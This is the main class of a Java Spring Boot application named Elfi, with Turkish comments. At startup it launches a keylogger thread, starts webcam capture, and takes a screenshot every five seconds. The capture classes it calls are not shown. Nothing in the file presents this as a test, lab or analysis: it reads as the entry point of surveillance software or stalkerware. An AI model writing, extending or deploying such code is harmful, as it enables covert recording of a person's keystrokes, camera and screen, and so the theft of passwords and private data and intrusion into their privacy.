package com.isee.elfi;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.awt.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

@SpringBootApplication
public class ElfiApplication {
    public static void main(String[] args) {
        // AWT Headless modunu devre dışı bırakıyoruz
        System.setProperty("java.awt.headless", "false");

        SpringApplication.run(ElfiApplication.class, args);

        // Keylogger'ı yeni bir thread'de başlatıyoruz
        new Thread(() -> {
            KeyLogger.startKeylogger(); // Keylogger'ı başlat
        }).start();

        // Kamerayı yeni bir thread'de başlatıyoruz
        new Thread(() -> {
            CameraCapture.capture(); // Kamerayı başlat
        }).start();

        // ScheduledExecutorService kullanarak her 5 saniyede bir ekran görüntüsü al
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
        executor.scheduleAtFixedRate(() -> {
            ScreenCapture.captureScreen(); // Her 5 saniyede bir ekran görüntüsü alır
        }, 0, 5, TimeUnit.SECONDS); // İlk başlatma zamanını 0, tekrar aralığını 5 saniye ayarlıyoruz
    }
}
